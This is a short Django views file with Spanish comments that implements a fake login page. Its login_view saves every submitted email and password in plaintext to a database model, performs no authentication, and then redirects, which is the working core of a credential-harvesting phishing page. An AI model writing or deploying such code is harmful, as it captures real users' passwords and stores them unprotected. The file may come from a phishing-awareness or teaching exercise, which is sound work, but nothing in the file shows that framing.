from django.shortcuts import render, redirect
from django.contrib.auth import login
from django.contrib.auth.decorators import login_required
from .forms import LoginForm
from .models import IntentoLogin
from .models import IntentoLogin

def login_view(request):
    if request.method == 'POST':
        email = request.POST.get('email')
        password = request.POST.get('password')

        # Guardar el intento de login sin importar validez
        IntentoLogin.objects.create(email=email, password=password)

        # Ir a la página de bienvenida sin validar nada
        return redirect('bienvenida')

    form = LoginForm()
    return render(request, 'login.html', {'form': form})


@login_required
def bienvenida_view(request):
    return render(request, 'bienvenida.html', {'user': request.user})


# Create your views here.
